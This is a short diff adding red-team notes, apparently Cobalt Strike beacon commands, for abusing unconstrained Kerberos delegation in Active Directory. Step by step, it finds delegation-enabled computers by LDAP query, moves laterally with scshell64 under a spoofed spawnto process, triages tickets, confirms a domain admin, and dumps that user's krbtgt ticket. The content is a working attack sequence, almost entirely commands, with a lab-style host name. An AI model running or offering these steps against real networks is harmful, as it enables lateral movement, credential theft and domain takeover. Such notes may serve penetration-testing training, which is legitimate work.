@@ -1,0 +1,14 @@
+use LDAP to find computers configured for unconstrained delegation
+    beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
+note any commputers found
+    e.g. LON-WS-1$
+impersonate a user to move laterally to lon-ws-1
+    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+    beacon> jump scshell64 lon-ws-1 smb
+now we should have a new beacon running on lon-ws-1
+triage tickets!
+    beacon> krb_triage
+confirm the user is a domain admin
+    beacon> ldapsearch samAccountName=dyork --attributes memberOf
+dump the ticket:
+    beacon> krb_dump /user:dyork /service:krbtgt
